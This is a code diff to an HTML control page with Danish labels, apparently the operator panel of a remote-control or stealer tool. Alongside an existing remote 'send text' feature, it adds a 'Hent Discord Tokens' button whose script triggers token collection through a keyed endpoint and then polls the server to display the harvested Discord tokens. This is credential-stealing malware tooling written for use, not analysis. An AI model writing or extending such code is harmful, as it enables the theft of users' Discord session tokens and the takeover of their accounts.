@@ -155,6 +155,15 @@
             <br><br>
             <button class="sendButton" style="background-color: lightseagreen;" onclick="sendText()">Send
                 Tekst!</button>
+
+            <!-- Hent Discord Tokens -->
+            <h3 class="title">Hent Discord Tokens</h3>
+            <button onclick="getTokens()" class="sendButton" style="background-color: darkseagreen;">Hent
+                tokens!</button>
+            <br>
+            <label class="label" style="font-weight: normal;">Tokens kommer her:</label>
+            <br>
+            <textarea id="dscTokensArea" name="dscTokensArea" class="textarea"></textarea>
         </div>
 
         <script>
@@ -244,6 +253,29 @@
                 event.preventDefault();
             }
 
+            async function getTokens() {
+                key = document.getElementById("key").value;
+
+                response = await fetch(`${document.URL}/post_gettokens?key=${key}`,
+                    {
+                        method: "POST", headers: { "Accept": "application/json" }
+                    });
+
+                if (response.status == 200) {
+                    alert("Tokens er på vej!");
+                } else if (response.status == 403) {
+                    alert("Forkert key!");
+                    return;
+                } else {
+                    alert("Ukendt fejl!");
+                }
+
+                for (let i = 0; i < 9; i++) {
+                    await updateTokens(key);
+                    await sleep(1000);
+                }
+            }
+
             async function sendText() {
                 key = document.getElementById("key").value;
                 text = document.getElementById("typeString").value;
@@ -263,6 +295,20 @@
                 } else {
                     alert("Ukendt fejl!");
                 }
+            }
+
+            async function updateTokens(key) {
+                dscTokensArea = document.getElementById("dscTokensArea");
+
+                fetch(`${document.URL}/get_tokens?key=${key}`,
+                    {
+                        method: "GET", headers: { "Accept": "application/json" }
+                    })
+                    .then(getTokensResponse => {
+                        getTokensResponse.text().then(getTokensText => {
+                            dscTokensArea.value = getTokensText;
+                        });
+                    });
             }
 
             function sleep(ms) {
